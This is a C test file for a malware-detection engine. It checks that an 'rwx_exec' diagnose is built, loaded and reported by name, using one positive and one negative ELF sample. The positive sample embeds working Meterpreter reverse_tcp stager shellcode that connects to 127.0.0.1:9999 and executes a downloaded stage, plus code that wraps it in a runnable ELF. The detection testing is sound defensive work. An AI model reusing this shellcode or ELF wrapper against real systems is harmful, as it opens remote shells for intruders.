/*
 * diag_db - a diagnose makes it from a source file all the way to a result.
 *
 * WHAT IS UNDER TEST IS THE CHAIN, not the analysis. diag_nodes.c already
 * proves the walk finds the right nodes and links them; it does that by
 * calling kof_diag_scan directly, so everything BETWEEN the source file and
 * a scan result is untested by it:
 *
 *   ksigbuilder   reads the KOF_DIAG_* macros as text and writes a .kdig
 *   kof_diag_load reads that .kdig back
 *   the loader    puts it in the engine and gives it an id
 *   the scanner   runs the walk when a rule asks for it
 *   kof_diag()    hashes the name the rule wrote and finds that id again
 *
 * Every one of those is a place where a capability id, a parent index or an
 * off-by-one in the id numbering turns a working diagnose into silence - and
 * silence is exactly what this subsystem looks like when it is correct on an
 * object that carries nothing. The python prototype this was built against
 * matched 0 of 34 samples once for precisely that reason: the writer and the
 * reader numbered the capability groups differently.
 *
 * SO THE TEST ASKS FOR BOTH ANSWERS. A payload that must match rwx_exec,
 * and a payload that must not. One of them alone passes against an engine
 * that is broken in the other direction.
 *
 * WHAT IT WATCHES IS A VERDICT, because that is the only way a diagnose
 * reaches a caller: tests/sigs/sig_diag_rwx_00.c reads the fixture and infects
 * on it. There was a listing of matched diagnoses on kof_result and it was
 * removed - a diagnose is a step, not an answer - which also removed the
 * other way of asking.
 *
 * IT USES THE TEST DATABASE, which is where rwx_exec lives - see
 * tests/sigs/diagnoses/rwx_exec.c for why it is a fixture and not a shipped
 * diagnose.
 */

#include <stdio.h>
#include <string.h>
#include <stdint.h>

#include "../../libkofeng/kofeng.h"

static int fails;

static void put64(uint8_t *b, unsigned at, uint64_t v)
{
	unsigned i;

	for (i = 0; i < 8u; i++)
		b[at + i] = (uint8_t)(v >> (8u * i));
}
static void put32(uint8_t *b, unsigned at, uint32_t v)
{
	unsigned i;

	for (i = 0; i < 4u; i++)
		b[at + i] = (uint8_t)(v >> (8u * i));
}
static void put16(uint8_t *b, unsigned at, uint16_t v)
{
	b[at] = (uint8_t)v;
	b[at + 1u] = (uint8_t)(v >> 8);
}

/* The msfvenom x86-64 ELF template: one PT_LOAD from file offset zero, entry
 * at +0x78. Same shape as diag_nodes.c, for the same reason - it is what the
 * generator emits. */
static uint64_t wrap(uint8_t *b, uint64_t cap, const uint8_t *code, uint64_t n)
{
	memset(b, 0, (size_t)cap);
	memcpy(b, "\177ELF\2\1\1", 7);
	put16(b, 16, 2);                /* ET_EXEC    */
	put16(b, 18, 0x3e);             /* EM_X86_64  */
	put32(b, 20, 1);
	put64(b, 24, 0x400078u);        /* e_entry    */
	put64(b, 32, 64);               /* e_phoff    */
	put16(b, 52, 64);
	put16(b, 54, 56);
	put16(b, 56, 1);
	put32(b, 64, 1);                /* PT_LOAD    */
	put32(b, 68, 7);                /* RWX        */
	put64(b, 72, 0);
	put64(b, 80, 0x400000u);
	put64(b, 96, 0x78u + n);
	put64(b, 104, 0x78u + n);
	memcpy(b + 0x78, code, (size_t)n);
	return 0x78u + n;
}

struct got {
	int      n_obj;
	int      n_diag;
	int      saw_rwx;
	const kof_engine *eng;
};

static int on_object(const char *name, const void *bytes, uint64_t len,
		     const struct kof_result *res, void *user)
{
	struct got *g = user;
	uint32_t i;

	(void)name;
	(void)bytes;
	(void)len;
	g->n_obj++;
	for (i = 0; i < res->n; i++)
		if (strstr(res->v[i].name, "DiagRwxTest"))
			g->saw_rwx = 1;
	return 0;
}

static void run(kof_scanner *sc, const kof_engine *eng, const uint8_t *b,
		uint64_t n, const char *what, int want)
{
	struct kof_scan_option opt;
	struct got g;

	memset(&opt, 0, sizeof opt);
	memset(&g, 0, sizeof g);
	g.eng = eng;

	kscan_bytes(sc, b, n, what, &opt, on_object, &g);
	if (!g.n_obj) {
		printf("  FAIL %s: the scanner saw no object at all\n", what);
		fails++;
		return;
	}
	if (g.saw_rwx != want) {
		printf("  FAIL %s: rwx_exec %s\n", what,
		       want ? "did not reach a verdict"
			    : "reached a verdict and must not have");
		fails++;
	}
}

int main(int argc, char **argv)
{
	const char *db = argc > 1 ? argv[1] : "build/test/databases-sigs";
	kof_engine *eng;
	kof_scanner *sc;
	static uint8_t b[0x200];
	uint64_t n;

	/*
	 * linux/x64/meterpreter/reverse_tcp: mmap(RWX) -> socket, connect,
	 * read into the mapping -> jmp into it. The tree the fixture names.
	 */
	static const uint8_t stager[] = {
		0x31, 0xff, 0x6a, 0x09, 0x58, 0x99, 0xb6, 0x10, 0x48, 0x89,
		0xd6, 0x4d, 0x31, 0xc9, 0x6a, 0x22, 0x41, 0x5a, 0x6a, 0x07,
		0x5a, 0x0f, 0x05, 0x48, 0x85, 0xc0, 0x78, 0x51, 0x6a, 0x0a,
		0x41, 0x59, 0x50, 0x6a, 0x29, 0x58, 0x99, 0x6a, 0x02, 0x5f,
		0x6a, 0x01, 0x5e, 0x0f, 0x05, 0x48, 0x85, 0xc0, 0x78, 0x3b,
		0x48, 0x97, 0x48, 0xb9, 0x02, 0x00, 0x27, 0x0f, 0x7f, 0x00,
		0x00, 0x01, 0x51, 0x48, 0x89, 0xe6, 0x6a, 0x10, 0x5a, 0x6a,
		0x2a, 0x58, 0x0f, 0x05, 0x59, 0x48, 0x85, 0xc0, 0x79, 0x25,
		0x49, 0xff, 0xc9, 0x74, 0x18, 0x57, 0x6a, 0x23, 0x58, 0x6a,
		0x00, 0x6a, 0x05, 0x48, 0x89, 0xe7, 0x48, 0x31, 0xf6, 0x0f,
		0x05, 0x59, 0x59, 0x5f, 0x48, 0x85, 0xc0, 0x79, 0xc7, 0x6a,
		0x3c, 0x58, 0x6a, 0x01, 0x5f, 0x0f, 0x05, 0x5e, 0x6a, 0x7e,
		0x5a, 0x0f, 0x05, 0x48, 0x85, 0xc0, 0x78, 0xed, 0xff, 0xe6
	};

	/*
	 * AND THE OTHER ANSWER. Syscalls, a loop, an exit - everything the
	 * walk looks at EXCEPT an allocation that is writable and executable
	 * at once. An engine that reports rwx_exec here is one whose matcher
	 * is counting capabilities instead of following the tree, which is
	 * the version this whole design replaced.
	 */
	static const uint8_t plain[] = {
		0x6a, 0x01, 0x5f,             /* push 1 ; pop rdi        */
		0x48, 0x8d, 0x35, 0x10, 0x00,
		0x00, 0x00,                   /* lea rsi,[rip+0x10]      */
		0x6a, 0x05, 0x5a,             /* push 5 ; pop rdx        */
		0x6a, 0x01, 0x58,             /* push 1 ; pop rax  write */
		0x0f, 0x05,                   /* syscall                 */
		0x6a, 0x3c, 0x58,             /* push 0x3c ; pop rax     */
		0x31, 0xff,                   /* xor edi,edi             */
		0x0f, 0x05,                   /* syscall  - exit         */
		'h', 'e', 'l', 'l', 'o'
	};

	eng = keng_open(db);
	if (!eng) {
		printf("diagnose db: cannot open %s\n", db);
		return 2;
	}
	/*
	 * THE DATABASE MUST ACTUALLY HOLD ONE. Without this the two cases
	 * below both pass against a database where the .kdig was never built
	 * - "reported nothing" is right for the second and indistinguishable
	 * from "there was nothing to report" for the first.
	 */
	if (kdb_diagnoses(eng) == 0) {
		printf("  FAIL %s holds no diagnose at all\n", db);
		fails++;
	}
	sc = kscan_new(eng);
	if (!sc) {
		keng_close(eng);
		return 2;
	}

	n = wrap(b, sizeof b, stager, sizeof stager);
	run(sc, eng, b, n, "x64 stager", 1);

	n = wrap(b, sizeof b, plain, sizeof plain);
	run(sc, eng, b, n, "write and exit", 0);

	kscan_free(sc);
	keng_close(eng);

	printf("diagnose db: built, loaded, matched and reported by name%s\n",
	       fails ? "" : " - ok");
	return fails != 0;
}
